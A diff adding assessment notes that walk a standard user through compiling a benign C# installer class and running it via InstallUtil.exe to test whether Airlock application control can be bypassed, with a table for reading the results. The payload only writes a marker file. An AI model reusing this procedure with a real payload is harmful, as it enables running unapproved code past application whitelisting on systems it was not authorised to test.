@@ -432,3 +432,106 @@ I’d expect, based on your earlier EXE testing, that CSC will probably compile 
 csc.exe was accessible to the standard user and permitted compilation of user-controlled C#; however, the resulting executable was prevented from running by Airlock. No application-control bypass was demonstrated via CSC.
 
 For InstallUtil, what you’ve shown so far is only that the binary is available. That is not yet a finding. We’d need a benign user-controlled assembly to determine whether it can actually be used as an indirect execution mechanism.
+
+
+Run this from the normal standard-user PowerShell session.
+whoami
+
+$src = "$env:TEMP\Ionize-InstallUtil-Test.cs"
+$dll = "$env:TEMP\Ionize-InstallUtil-Test.dll"
+$marker = "$env:TEMP\Ionize-InstallUtil-Executed.txt"
+
+Create the test source:
+@'
+using System;
+using System.Collections;
+using System.ComponentModel;
+using System.Configuration.Install;
+using System.IO;
+
+[RunInstaller(true)]
+public class IonizeInstaller : Installer
+{
+    public override void Install(IDictionary stateSaver)
+    {
+        base.Install(stateSaver);
+
+        string marker = Path.Combine(
+            Path.GetTempPath(),
+            "Ionize-InstallUtil-Executed.txt"
+        );
+
+        File.WriteAllText(
+            marker,
+            "Ionize InstallUtil application control test" +
+            Environment.NewLine +
+            "User: " + Environment.UserName +
+            Environment.NewLine +
+            "Machine: " + Environment.MachineName
+        );
+
+        Console.WriteLine("Ionize InstallUtil application control test");
+        Console.WriteLine("User: " + Environment.UserName);
+        Console.WriteLine("Machine: " + Environment.MachineName);
+    }
+}
+'@ | Set-Content $src -Encoding ASCII
+
+Check the source:
+Get-Content $src
+
+Compile it using the CSC you already confirmed works:
+& "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" `
+    /target:library `
+    /reference:"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Configuration.Install.dll" `
+    /out:$dll `
+    $src
+
+"CSC exit code: $LASTEXITCODE"
+
+Confirm the DLL exists:
+Get-Item $dll
+
+Now run it through the 64-bit InstallUtil:
+& "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe" `
+    /LogToConsole=true `
+    $dll
+
+"InstallUtil exit code: $LASTEXITCODE"
+
+Then check whether your marker was created:
+Test-Path $marker
+Get-Content $marker -ErrorAction SilentlyContinue
+
+If the marker contains something like:
+Ionize InstallUtil application control test
+User: matthew.dunn
+Machine: <hostname>
+
+then user-controlled code executed through InstallUtil.
+You can repeat the same test with the 32-bit version:
+Remove-Item $marker -Force -ErrorAction SilentlyContinue
+
+& "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe" `
+    /LogToConsole=true `
+    $dll
+
+"InstallUtil exit code: $LASTEXITCODE"
+
+Get-Content $marker -ErrorAction SilentlyContinue
+
+Interpret it like this:
+Outcome	Result
+Airlock blocks InstallUtil.exe	PASS
+InstallUtil runs but Airlock blocks loading the DLL	PASS
+InstallUtil runs, marker appears	Application-control bypass confirmed
+InstallUtil errors because assembly format/framework is incompatible	Inconclusive
+InstallUtil says admin required before your marker runs	No standard-user bypass demonstrated
+
+
+The best evidence screenshot would show:
+whoami
+InstallUtil command
+Ionize marker output
+InstallUtil exit code
+Get-Content ...Ionize-InstallUtil-Executed.txt
